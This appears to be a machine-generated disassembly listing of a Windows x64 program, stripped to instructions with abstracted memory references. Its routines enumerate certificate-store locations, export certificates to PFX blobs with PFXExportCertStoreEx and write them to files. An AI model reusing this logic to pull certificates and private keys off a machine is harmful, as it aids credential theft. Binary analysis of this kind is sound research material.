sub_140001010
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov ebx edx
mov rdi rcx
mov [ rcx ] rax
call sub_14003a7e8
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_14003ad04
sub_140001060
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x27 ]
sub rsp 0x90
mov [ rbp - 0x29 ] 0xfffffffffffffffe
mov [ rsp + 0xe0 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x17 ] rax
mov r13 rdx
mov rdi rcx
mov [ rbp - 0x21 ] rcx
xor r14d r14d
mov [ rbp - 0x49 ] r14
mov [ rbp - 0x41 ] r14
mov [ rbp - 0x39 ] r14
mov [ rbp - 0x1 ] 0x7
mov [ rbp - 0x9 ] r14
mov [ rbp - 0x19 ] r14w
lea r8d [ r14 + 0x1e ]
lea rdx [ r--data ]
lea rcx [ rbp - 0x19 ]
call sub_140001ea0
mov [ rbp + 0xf ] 0x10000
lea rdx [ rbp - 0x19 ]
lea rcx [ rbp - 0x49 ]
call sub_140001be0
nop
cmp [ rbp - 0x1 ] 0x8
jb r-xdata
mov [ rbp - 0x1 ] 0x7
mov [ rbp - 0x9 ] r14
mov [ rbp - 0x19 ] r14w
mov r8d 0x2b
lea rdx [ r--data ]
lea rcx [ rbp - 0x19 ]
call sub_140001ea0
mov [ rbp + 0xf ] 0x70000
lea rdx [ rbp - 0x19 ]
lea rcx [ rbp - 0x49 ]
call sub_140001be0
nop
cmp [ rbp - 0x1 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x19 ]
call j_sub_14003ad04
mov [ rbp - 0x1 ] 0x7
mov [ rbp - 0x9 ] r14
mov [ rbp - 0x19 ] r14w
mov r8d 0x1f
lea rdx [ r--data ]
lea rcx [ rbp - 0x19 ]
call sub_140001ea0
mov [ rbp + 0xf ] 0x20000
lea rdx [ rbp - 0x19 ]
lea rcx [ rbp - 0x49 ]
call sub_140001be0
nop
cmp [ rbp - 0x1 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x19 ]
call j_sub_14003ad04
mov [ rbp - 0x1 ] 0x7
mov [ rbp - 0x9 ] r14
mov [ rbp - 0x19 ] r14w
mov r8d 0x2c
lea rdx [ r--data ]
lea rcx [ rbp - 0x19 ]
call sub_140001ea0
mov [ rbp + 0xf ] 0x80000
lea rdx [ rbp - 0x19 ]
lea rcx [ rbp - 0x49 ]
call sub_140001be0
nop
cmp [ rbp - 0x1 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x19 ]
call j_sub_14003ad04
mov [ rbp - 0x1 ] 0x7
mov [ rbp - 0x9 ] r14
mov [ rbp - 0x19 ] r14w
mov r8d 0x2a
lea rdx [ r--data ]
lea rcx [ rbp - 0x19 ]
call sub_140001ea0
mov [ rbp + 0xf ] 0x90000
lea rdx [ rbp - 0x19 ]
lea rcx [ rbp - 0x49 ]
call sub_140001be0
nop
cmp [ rbp - 0x1 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x19 ]
call j_sub_14003ad04
mov [ rbp - 0x1 ] 0x7
mov [ rbp - 0x9 ] r14
mov [ rbp - 0x19 ] r14w
mov r8d 0x21
lea rdx [ r--data ]
lea rcx [ rbp - 0x19 ]
call sub_140001ea0
mov [ rbp + 0xf ] 0x40000
lea rdx [ rbp - 0x19 ]
lea rcx [ rbp - 0x49 ]
call sub_140001be0
nop
cmp [ rbp - 0x1 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x19 ]
call j_sub_14003ad04
mov [ rbp - 0x1 ] 0x7
mov [ rbp - 0x9 ] r14
mov [ rbp - 0x19 ] r14w
mov r8d 0x17
lea rdx [ r--data ]
lea rcx [ rbp - 0x19 ]
call sub_140001ea0
mov [ rbp + 0xf ] 0x60000
lea rdx [ rbp - 0x19 ]
lea rcx [ rbp - 0x49 ]
call sub_140001be0
nop
cmp [ rbp - 0x1 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x19 ]
call j_sub_14003ad04
mov [ rbp - 0x1 ] 0x7
mov [ rbp - 0x9 ] r14
mov [ rbp - 0x19 ] r14w
mov r8d 0x1a
lea rdx [ r--data ]
lea rcx [ rbp - 0x19 ]
call sub_140001ea0
mov [ rbp + 0xf ] 0x50000
lea rdx [ rbp - 0x19 ]
lea rcx [ rbp - 0x49 ]
call sub_140001be0
nop
cmp [ rbp - 0x1 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x19 ]
call j_sub_14003ad04
mov r12 [ rbp - 0x49 ]
mov rax r12
mov rsi [ rbp - 0x41 ]
cmp r12 rsi
je r-xdata
mov rcx [ rbp - 0x19 ]
call j_sub_14003ad04
test r12 r12
je r-xdata
mov r11 [ rdi + 0x10 ]
mov rbx [ rdi + 0x18 ]
or r15d 0xffffffff
nop [ rax ] eax
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
mov rbx r12
cmp r12 rsi
je r-xdata
mov r8 rdi
mov r8 [ rdi ]
jmp r-xdata
xor al al
mov rcx [ rdi ]
call j_sub_14003ad04
mov rcx r12
call j_sub_14003ad04
nop
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rdx rax
mov rdx [ rax ]
jmp r-xdata
mov r10 [ rax + 0x10 ]
cmp r10 r10
cmp [ rax + 0x18 ] 0x8
jb r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r14
mov [ rbx ] r14w
add rbx 0x30
cmp rbx rsi
jne r-xdata
mov rcx [ rbx ]
call j_sub_14003ad04
mov r9d r14d
movzx ecx [ r8 ]
cmp [ rdx ] cx
jne r-xdata
mov r9 r11
cmp r10 r11
cmovb r9 r10
test r9 r9
je r-xdata
test ecx ecx
je r-xdata
cmp r10 r11
jb r-xdata
mov r9d 0x1
cmp [ rdx ] cx
cmovb r9d r15d
jmp r-xdata
add rdx 0x2
add r8 0x2
dec r9
jne r-xdata
mov ecx [ rax + 0x28 ]
mov [ r13 ] ecx
test r12 r12
je r-xdata
add rax 0x30
cmp rax rsi
je r-xdata
mov ecx r14d
setne cl
movsxd rcx r9d
test r9d r9d
jne r-xdata
jmp r-xdata
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
mov rbx r12
nop
jmp r-xdata
mov al 0x1
jmp r-xdata
mov rcx [ rdi ]
call j_sub_14003ad04
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r14
mov [ rbx ] r14w
add rbx 0x30
cmp rbx rsi
jne r-xdata
mov rcx [ rbx ]
call j_sub_14003ad04
cmp rbx 0x8
jb r-xdata
mov [ rdi + 0x18 ] 0x7
mov [ rdi + 0x10 ] r14
mov [ rdi ] r14w
mov rcx [ rbp + 0x17 ]
xor rcx rsp
call sub_14003a6a0
mov rbx [ rsp + 0xe0 ]
add rsp 0x90
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rcx r12
call j_sub_14003ad04
nop
sub_140001490
push rdi
sub rsp 0x60
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x78 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x50 ] rax
mov rdx rcx
mov rbx [ rsp + 0x90 ]
mov [ rsp + 0x40 ] 0x7
xor eax eax
mov [ rsp + 0x38 ] rax
mov [ rsp + 0x28 ] ax
or rcx 0xffffffffffffffff
mov rdi rdx
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
lea rcx [ rsp + 0x28 ]
call sub_140001ea0
nop
lea rdx [ rsp + 0x28 ]
mov rcx rbx
call sub_140001cf0
nop
cmp [ rsp + 0x40 ] 0x8
jb r-xdata
mov eax 0x1
mov rcx [ rsp + 0x50 ]
xor rcx rsp
call sub_14003a6a0
mov rbx [ rsp + 0x78 ]
add rsp 0x60
pop rdi
retn
mov rcx [ rsp + 0x28 ]
call j_sub_14003ad04
sub_140001530
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x20 ] rbp
push rdi
sub rsp 0x30
xor eax eax
mov rbp rdx
xor r9d r9d
mov [ rsp + 0x28 ] eax
lea edx [ rax + 0x4 ]
xor r8d r8d
mov rbx rcx
mov [ rsp + 0x20 ] rax
call [ CertGetNameStringW@IAT ]
mov edi eax
cmp eax 0x1
jbe r-xdata
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
xor al al
add rsp 0x30
pop rdi
retn
mov eax 0x2
mov [ rsp + 0x40 ] rsi
mov [ rsp + 0x48 ] r12
mov r12 0xffffffffffffffff
mul rdi
cmovo rax r12
mov rcx rax
call j_sub_14003ac60
lea edx [ r12 + 0x5 ]
xor r9d r9d
xor r8d r8d
mov rcx rbx
mov [ rsp + 0x28 ] edi
mov rsi rax
mov [ rsp + 0x20 ] rax
call [ CertGetNameStringW@IAT ]
cmp eax 0x1
mov rcx r12
mov rdi rsi
seta bl
xor eax eax
mov rdx rsi
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
mov rcx rbp
call sub_140001ea0
mov rcx rsi
call j_sub_14003ad04#2
mov r12 [ rsp + 0x48 ]
mov rsi [ rsp + 0x40 ]
movzx eax bl
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
add rsp 0x30
pop rdi
retn
sub_140001610
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rbx rcx
mov ecx [ r8 ]
mov rdi r8
mov rbp rdx
call j_sub_14003ac60
mov r9 rdi
mov edx 0x2
mov rcx rbx
mov r8 rax
mov rsi rax
call [ CertGetCertificateContextProperty@IAT ]
test eax eax
setne bl
test bl bl
je r-xdata
mov rcx rsi
call j_sub_14003ad04#2
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
movzx eax bl
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rdx [ rsi + 0x8 ]
test rdx rdx
je r-xdata
mov r8d 0x6
lea rdx [ r--data ]
or rcx 0xffffffffffffffff
xor eax eax
mov rdi rdx
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
jmp r-xdata
mov r8d 0x6
lea rdx [ r--data ]
or rcx 0xffffffffffffffff
xor eax eax
mov rdi rdx
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
jmp r-xdata
lea rcx [ rbp + 0x28 ]
call sub_140001ea0
mov rdx [ rsi ]
test rdx rdx
je r-xdata
mov rcx rbp
call sub_140001ea0
mov ecx [ rsi + 0x18 ]
mov [ rbp + 0x58 ] ecx
mov ecx [ rsi + 0x14 ]
mov [ rbp + 0x54 ] ecx
mov ecx [ rsi + 0x28 ]
mov [ rbp + 0x5c ] ecx
mov ecx [ rsi + 0x10 ]
mov [ rbp + 0x50 ] ecx
sub_140001700
push rbp
push rsi
push rdi
push r12
push r13
sub rsp 0x80
mov [ rsp + 0x58 ] 0xfffffffffffffffe
mov [ rsp + 0xc8 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x70 ] rax
mov rdi r8
mov rsi rdx
mov rbx rcx
mov [ rsp + 0x60 ] rdx
mov [ rsp + 0x68 ] r8
xor r12b r12b
xor r13d r13d
mov [ rsp + 0x20 ] r13
mov r9d 0x2000
xor r8d r8d
xor edx edx
lea ecx [ rdx + 0x2 ]
call [ CertOpenStore@IAT ]
mov rbp rax
mov [ rsp + 0x50 ] r13
lea r9 [ rsp + 0x50 ]
lea r8d [ r13 + 0x1 ]
mov rdx rbx
mov rcx rax
call [ CertAddCertificateContextToStore@IAT ]
test eax eax
je r-xdata
mov edx 0x1
mov rcx rbp
call [ CertCloseStore@IAT ]
nop
cmp [ rsi + 0x18 ] 0x8
jb r-xdata
mov [ rsp + 0x48 ] r13
mov [ rsp + 0x40 ] r13d
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
mov [ rsi + 0x18 ] 0x7
mov [ rsi + 0x10 ] r13
mov [ rsi ] r13w
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
mov rcx [ rsi ]
call j_sub_14003ad04
mov r8 rdi
mov r8 [ rdi ]
jmp r-xdata
mov [ rdi + 0x18 ] 0x7
mov [ rdi + 0x10 ] r13
mov [ rdi ] r13w
movzx eax r12b
mov rcx [ rsp + 0x70 ]
xor rcx rsp
call sub_14003a6a0
mov rbx [ rsp + 0xc8 ]
add rsp 0x80
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov rcx [ rdi ]
call j_sub_14003ad04
mov rcx [ rsp + 0x50 ]
call [ CertFreeCertificateContext@IAT ]
mov ecx [ rsp + 0x40 ]
call j_sub_14003ac60
mov [ rsp + 0x48 ] rax
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
mov [ rsp + 0x20 ] 0x6
xor r9d r9d
lea rdx [ rsp + 0x40 ]
mov rcx rbp
call [ PFXExportCertStoreEx@IAT ]
test eax eax
je r-xdata
mov r8 rdi
mov r8 [ rdi ]
jmp r-xdata
mov rcx [ rsp + 0x48 ]
call j_sub_14003ad04#2
cmp [ rsi + 0x18 ] 0x8
jb r-xdata
mov [ rsp + 0x20 ] 0x6
xor r9d r9d
lea rdx [ rsp + 0x40 ]
mov rcx rbp
call [ PFXExportCertStoreEx@IAT ]
test eax eax
je r-xdata
mov rcx rsi
mov rcx [ rsi ]
jmp r-xdata
cmp rax 0xffffffffffffffff
je r-xdata
mov [ rsp + 0x30 ] r13
mov [ rsp + 0x28 ] r13d
mov [ rsp + 0x20 ] 0x2
xor r9d r9d
xor r8d r8d
mov edx 0x40000000
call [ CreateFileW@IAT ]
mov rbx rax
test rax rax
je r-xdata
mov [ rsp + 0x20 ] r13
lea r9 [ rsp + 0x60 ]
mov r8d [ rsp + 0x40 ]
mov rdx [ rsp + 0x48 ]
mov rcx rax
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov rcx rbx
call [ CloseHandle@IAT ]
mov eax [ rsp + 0x60 ]
cmp [ rsp + 0x40 ] eax
jne r-xdata
mov rcx rbx
call [ FlushFileBuffers@IAT ]
test eax eax
setne r12b
sub_140001910
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x20 ] rbp
push rsi
push rdi
push r12
sub rsp 0x50
xor sil sil
cmp [ rdx + 0x18 ] 0x8
mov rbx rdx
mov rbp rcx
jb r-xdata
mov rcx rdx
mov rcx [ rdx ]
jmp r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
cmp rax 0xffffffffffffffff
je r-xdata
xor r12d r12d
xor r9d r9d
xor r8d r8d
mov [ rsp + 0x30 ] r12
mov edx 0x40000000
mov [ rsp + 0x28 ] r12d
mov [ rsp + 0x20 ] 0x2
call [ CreateFileW@IAT ]
mov rdi rax
test rax rax
je r-xdata
lea r11 [ rsp + 0x50 ]
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r12
mov rbp [ r11 + 0x38 ]
mov [ rbx ] r12w
mov rbx [ r11 + 0x30 ]
movzx eax sil
mov rsp r11
pop r12
pop rdi
pop rsi
retn
mov rcx [ rbx ]
call j_sub_14003ad04
mov r8d [ rbp + 0x10 ]
mov rdx [ rbp + 0x8 ]
lea r9 [ rsp + 0x40 ]
mov rcx rax
mov [ rsp + 0x20 ] r12
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov rcx rdi
call [ CloseHandle@IAT ]
mov eax [ rsp + 0x40 ]
cmp [ rbp + 0x10 ] eax
jne r-xdata
mov rcx rdi
call [ FlushFileBuffers@IAT ]
test eax eax
setne sil
sub_1400019f0
mov [ rsp + 0x20 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
mov rbp rsp
sub rsp 0x70
mov rax [ rw-data ]
xor rax rsp
mov [ rbp - 0x10 ] rax
xor sil sil
cmp [ r8 + 0x18 ] 0x8
mov rbx r8
mov r12 rcx
mov [ rbp - 0x2c ] edx
mov [ rbp - 0x28 ] 0xb0b5f11e
mov [ rbp - 0x24 ] 0x0
mov [ rbp - 0x20 ] 0x1
mov [ rbp - 0x18 ] 0x0
jb r-xdata
mov rcx rbx
mov rcx [ r8 ]
jmp r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
cmp rax 0xffffffffffffffff
je r-xdata
xor r13d r13d
xor r9d r9d
xor r8d r8d
mov [ rsp + 0x30 ] r13
mov edx 0x40000000
mov [ rsp + 0x28 ] r13d
mov [ rsp + 0x20 ] 0x2
call [ CreateFileW@IAT ]
mov rdi rax
test rax rax
je r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r13
movzx eax sil
mov [ rbx ] r13w
mov rcx [ rbp - 0x10 ]
xor rcx rsp
call sub_14003a6a0
mov rbx [ rsp + 0xb8 ]
add rsp 0x70
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov rcx [ rbx ]
call j_sub_14003ad04
lea r9 [ rbp - 0x30 ]
lea r8d [ r13 + 0x14 ]
lea rdx [ rbp - 0x28 ]
mov rcx rax
mov [ rsp + 0x20 ] r13
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov rcx rdi
call [ CloseHandle@IAT ]
cmp [ rbp - 0x30 ] 0x14
jne r-xdata
lea r9 [ rbp - 0x30 ]
lea r8d [ r13 + 0x4 ]
lea rdx [ rbp - 0x2c ]
mov rcx rdi
mov [ rsp + 0x20 ] r13
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ rbp - 0x30 ] 0x4
jne r-xdata
mov r8d [ rbp - 0x2c ]
lea r9 [ rbp - 0x30 ]
mov rdx r12
mov rcx rdi
mov [ rsp + 0x20 ] r13
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov eax [ rbp - 0x30 ]
cmp [ rbp - 0x2c ] eax
jne r-xdata
mov rcx rdi
call [ FlushFileBuffers@IAT ]
test eax eax
setne sil
sub_140001b50
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov [ rcx + 0x18 ] 0x7
mov rbx rcx
xor eax eax
mov [ rcx + 0x10 ] rax
mov [ rcx ] ax
or rcx 0xffffffffffffffff
mov rdi rdx
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
mov rcx rbx
call sub_140001ea0
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_140001ba0
push rbx
sub rsp 0x20
cmp [ rcx + 0x18 ] 0x8
mov rbx rcx
jb r-xdata
xor eax eax
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rax
mov [ rbx ] ax
add rsp 0x20
pop rbx
retn
mov rcx [ rcx ]
call j_sub_14003ad04
sub_140001be0
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov [ rsp + 0x58 ] rsi
mov rsi rdx
mov rbx rcx
mov rcx [ rcx + 0x8 ]
cmp rdx rcx
jae r-xdata
cmp rcx [ rbx + 0x10 ]
jne r-xdata
mov rax [ rbx ]
cmp rax rdx
ja r-xdata
mov rdi [ rbx + 0x8 ]
mov [ rsp + 0x40 ] rdi
mov [ rsp + 0x48 ] rdi
test rdi rdi
je r-xdata
mov rcx rbx
call sub_140001f90
sub rsi rax
mov rax 0x2aaaaaaaaaaaaaab
imul rsi
mov rdi rdx
sar rdi 0x3
mov rax rdi
shr rax 0x3f
add rdi rax
cmp rcx [ rbx + 0x10 ]
jne r-xdata
add [ rbx + 0x8 ] 0x30
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x30
pop rdi
retn
mov [ rdi + 0x18 ] 0x7
xor eax eax
mov [ rdi + 0x10 ] rax
mov [ rdi ] ax
mov rdx rsi
mov rcx rdi
call sub_1400027f0
mov r11d [ rsi + 0x28 ]
mov [ rdi + 0x28 ] r11d
lea rsi [ rdi + rdi * 2 ]
shl rsi 0x4
add rsi [ rbx ]
mov rdi [ rbx + 0x8 ]
mov [ rsp + 0x40 ] rdi
mov [ rsp + 0x48 ] rdi
test rdi rdi
je r-xdata
mov rcx rbx
call sub_140001f90
jmp r-xdata
mov [ rdi + 0x18 ] 0x7
xor eax eax
mov [ rdi + 0x10 ] rax
mov [ rdi ] ax
mov rdx rsi
mov rcx rdi
call sub_1400027f0
mov r11d [ rsi + 0x28 ]
mov [ rdi + 0x28 ] r11d
sub_140001cf0
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov rdi rdx
mov rbx rcx
mov rcx [ rcx + 0x8 ]
cmp rdx rcx
jae r-xdata
cmp rcx [ rbx + 0x10 ]
jne r-xdata
mov rax [ rbx ]
cmp rax rdx
ja r-xdata
mov rcx [ rbx + 0x8 ]
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x48 ] rcx
test rcx rcx
je r-xdata
mov rcx rbx
call sub_1400020d0
sub rdi rax
mov rax 0x6666666666666667
imul rdi
mov rdi rdx
sar rdi 0x4
mov rax rdi
shr rax 0x3f
add rdi rax
cmp rcx [ rbx + 0x10 ]
jne r-xdata
add [ rbx + 0x8 ] 0x28
mov rbx [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
mov [ rcx + 0x18 ] 0x7
xor eax eax
mov [ rcx + 0x10 ] rax
mov [ rcx ] ax
mov rdx rdi
call sub_1400027f0
nop
lea rcx [ rdi + rdi * 4 ]
mov rax [ rbx ]
lea rdx [ rax + rcx * 8 ]
mov rcx [ rbx + 0x8 ]
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x48 ] rcx
test rcx rcx
je r-xdata
mov rcx rbx
call sub_1400020d0
jmp r-xdata
mov [ rcx + 0x18 ] 0x7
xor eax eax
mov [ rcx + 0x10 ] rax
mov [ rcx ] ax
call sub_1400027f0
nop
sub_140001dd0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
push r12
sub rsp 0x20
mov rsi [ rdx + 0x10 ]
mov r12 r8
mov rdi rdx
mov rbx rcx
cmp rsi r8
jae r-xdata
sub rsi r8
cmp r9 rsi
cmovb rsi r9
cmp rcx rdx
jne r-xdata
lea rcx [ r--data ]
call sub_140037948
mov rdx rsi
call sub_140002230
test al al
je r-xdata
lea rdx [ rsi + r8 ]
or r8 0xffffffffffffffff
call sub_140002190
mov r8 r12
xor edx edx
mov rcx rbx
call sub_140002190
jmp r-xdata
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop r12
retn
cmp [ rdi + 0x18 ] 0x8
mov [ rsp + 0x30 ] rbp
jb r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rdi [ rdi ]
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
lea rbp [ rsi + rsi ]
lea rdx [ rdi + r12 * 2 ]
mov r8 rbp
call sub_14003a8c0
cmp [ rbx + 0x18 ] 0x8
mov [ rbx + 0x10 ] rsi
jb r-xdata
xor ecx ecx
mov [ rax + rbp ] cx
mov rbp [ rsp + 0x30 ]
sub_140001ea0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
push rdi
sub rsp 0x20
mov rbp r8
mov rdi rdx
mov rbx rcx
test rdx rdx
je r-xdata
mov rdx r8
mov rcx rbx
call sub_140002230
test al al
je r-xdata
mov r9 [ rcx + 0x18 ]
cmp r9 0x8
jb r-xdata
mov rbp [ rsp + 0x40 ]
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
cmp [ rbx + 0x18 ] 0x8
mov [ rsp + 0x30 ] rsi
jb r-xdata
mov rax rcx
mov rax [ rcx ]
jmp r-xdata
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
cmp r9 0x8
jb r-xdata
cmp rdx rax
jb r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
lea rsi [ rbp + rbp ]
mov rdx rdi
mov r8 rsi
call sub_14003a8c0
cmp [ rbx + 0x18 ] 0x8
mov [ rbx + 0x10 ] rbp
jb r-xdata
mov rax [ rbx + 0x10 ]
lea rcx [ rcx + rax * 2 ]
cmp rcx rdx
jbe r-xdata
mov rcx [ rcx ]
xor ecx ecx
mov [ rsi + rax ] cx
mov rsi [ rsp + 0x30 ]
cmp r9 0x8
jb r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
sub rdi rax
mov r9 r8
mov rdx rbx
sar rdi 0x1
mov rcx rbx
mov r8 rdi
mov rbx [ rsp + 0x38 ]
mov rbp [ rsp + 0x40 ]
add rsp 0x20
pop rdi
jmp sub_140001dd0
sub_140001f90
sub rsp 0x28
mov r10 [ rcx ]
mov rdx [ rcx + 0x8 ]
mov r11 0x2aaaaaaaaaaaaaab
sub rdx r10
mov rax r11
mov r9 rcx
imul rdx
mov r8 rdx
sar r8 0x3
mov rax r8
shr rax 0x3f
add r8 rax
mov rax 0x555555555555554
cmp r8 rax
jbe r-xdata
mov rcx [ rcx + 0x10 ]
mov rax r11
inc r8
sub rcx r10
imul rcx
sar rdx 0x3
mov rax rdx
shr rax 0x3f
add rdx rax
cmp r8 rdx
jbe r-xdata
lea rcx [ r--data ]
call sub_1400378ec
add rsp 0x28
retn
mov rcx rdx
mov rax 0x555555555555555
shr rcx 0x1
sub rax rcx
cmp rax rdx
jae r-xdata
add rdx rcx
mov rcx r9
cmp rdx r8
cmovb rdx r8
call sub_1400022b0
xor edx edx
mov rcx r9
cmp rdx r8
cmovb rdx r8
add rsp 0x28
jmp sub_1400022b0
sub_140002050
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
push rdi
sub rsp 0x20
mov rbx [ rcx ]
xor ebp ebp
mov rdi rcx
test rbx rbx
je r-xdata
mov rbx [ rsp + 0x38 ]
mov [ rdi ] rbp
mov [ rdi + 0x8 ] rbp
mov [ rdi + 0x10 ] rbp
mov rbp [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
mov [ rsp + 0x30 ] rsi
mov rsi [ rcx + 0x8 ]
cmp rbx rsi
je r-xdata
mov rcx [ rdi ]
call j_sub_14003ad04
mov rsi [ rsp + 0x30 ]
nop [ rax + rax ] ax
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rbp
mov [ rbx ] bp
add rbx 0x30
cmp rbx rsi
jne r-xdata
mov rcx [ rbx ]
call j_sub_14003ad04
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
sub_1400020d0
sub rsp 0x28
mov r10 [ rcx ]
mov rdx [ rcx + 0x8 ]
mov r11 0x6666666666666667
sub rdx r10
mov rax r11
mov r9 rcx
imul rdx
mov r8 rdx
sar r8 0x4
mov rax r8
shr rax 0x3f
add r8 rax
mov rax 0x666666666666665
cmp r8 rax
jbe r-xdata
mov rcx [ rcx + 0x10 ]
mov rax r11
inc r8
sub rcx r10
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp r8 rdx
jbe r-xdata
lea rcx [ r--data ]
call sub_1400378ec
add rsp 0x28
retn
mov rcx rdx
mov rax 0x666666666666666
shr rcx 0x1
sub rax rcx
cmp rax rdx
jae r-xdata
add rdx rcx
mov rcx r9
cmp rdx r8
cmovb rdx r8
call sub_140002460
xor edx edx
mov rcx r9
cmp rdx r8
cmovb rdx r8
add rsp 0x28
jmp sub_140002460
sub_140002190
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi r8
mov r8 [ rcx + 0x10 ]
mov r9 rdx
mov rbx rcx
cmp r8 rdx
jae r-xdata
sub r8 rdx
cmp r8 rdi
cmovb rdi r8
test rdi rdi
je r-xdata
lea rcx [ r--data ]
call sub_140037948
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rax [ rcx + 0x18 ]
cmp rax 0x8
jb r-xdata
mov rdx rcx
mov rdx [ rcx ]
jmp r-xdata
lea rax [ r9 + rdi ]
sub r8 rdi
lea rcx [ rcx + r9 * 2 ]
lea rdx [ rdx + rax * 2 ]
add r8 r8
call sub_14003a8c0
mov r11 [ rbx + 0x10 ]
sub r11 rdi
cmp [ rbx + 0x18 ] 0x8
mov [ rbx + 0x10 ] r11
jb r-xdata
mov rcx [ rcx ]
cmp rax 0x8
jb r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
xor ecx ecx
mov [ rax + r11 * 2 ] cx
sub_140002230
push rdi
sub rsp 0x20
mov rax 0x7ffffffffffffffe
mov rdi rdx
cmp rdx rax
jbe r-xdata
mov rax [ rcx + 0x18 ]
mov [ rsp + 0x30 ] rbx
xor ebx ebx
cmp rax rdx
jae r-xdata
lea rcx [ r--data ]
call sub_1400378ec
test rdx rdx
jne r-xdata
mov r8 [ rcx + 0x10 ]
call sub_1400025a0
mov rbx [ rsp + 0x30 ]
test rdi rdi
setne al
add rsp 0x20
pop rdi
retn
mov rbx [ rsp + 0x30 ]
test rdi rdi
setne al
add rsp 0x20
pop rdi
retn
mov [ rcx + 0x10 ] rbx
cmp rax 0x8
jb r-xdata
mov [ rcx ] bx
mov rcx [ rcx ]
sub_1400022b0
push r12
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov [ rsp + 0x60 ] rsi
mov [ rsp + 0x68 ] rdi
mov rdi rdx
mov rsi rcx
mov rax 0x555555555555555
cmp rdx rax
jbe r-xdata
mov rcx [ rcx + 0x10 ]
sub rcx [ rsi ]
